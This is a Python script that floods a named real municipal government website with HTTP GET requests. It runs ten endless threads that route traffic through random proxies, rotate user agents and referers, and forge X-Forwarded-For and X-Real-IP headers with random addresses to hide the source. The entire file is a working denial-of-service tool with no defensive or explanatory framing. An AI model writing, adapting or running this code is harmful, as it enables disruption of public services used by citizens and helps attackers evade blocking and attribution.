import threading
import requests
import random
import string
import time

target_url = "https://www.guaruja.sp.gov.br/"

with open('useragents.txt', 'r') as file:
    user_agents = [line.strip() for line in file.readlines()]

with open('referers.txt', 'r') as file:
    referers = [line.strip() for line in file.readlines()]

with open('proxy.txt', 'r') as file:
    proxies_list = [line.strip() for line in file.readlines()]

def get_random_ip():
    time.sleep(random.uniform(0.1, 0.5))
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def get_proxy():
    proxy_entry = random.choice(proxies_list)
    proxy_parts = proxy_entry.split(':')
    if proxy_parts[0] in ['http', 'https', 'socks4', 'socks5']:
        proxy_type = proxy_parts[0]
        proxy_url = f"{proxy_type}://{':'.join(proxy_parts[1:])}"
        return {"http": proxy_url, "https": proxy_url}
    return None

def flood():
    while True:
        custom_headers = {
            "User-Agent": random.choice(user_agents),
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Accept": "*/*",
            "Referer": random.choice(referers),
            "Accept-Encoding": "gzip, deflate",
            "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-For": get_random_ip(),
            "X-Forwarded-Proto": "http",
            "X-Real-IP": get_random_ip(),
            "X-Frame-Options": "deny",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "1; mode=block",
            "DNT": "1",
            "If-None-Match": 'W/"cb85038b0d4e19"',
            "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
            "Cookie": "".join(random.choices(string.ascii_letters + string.digits, k=20))
        }
        proxy_dict = get_proxy()
        time.sleep(random.uniform(0.5, 2))

        if proxy_dict is not None:
            try:
                response = requests.get(target_url, headers=custom_headers, proxies=proxy_dict)
                print(f"GET request sent to {target_url} via {list(proxy_dict.values())[0]}. Response status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"An error occurred: {e}")
        else:
            print("Invalid proxy format.")

num_threads = 10

threads = []
for _ in range(num_threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()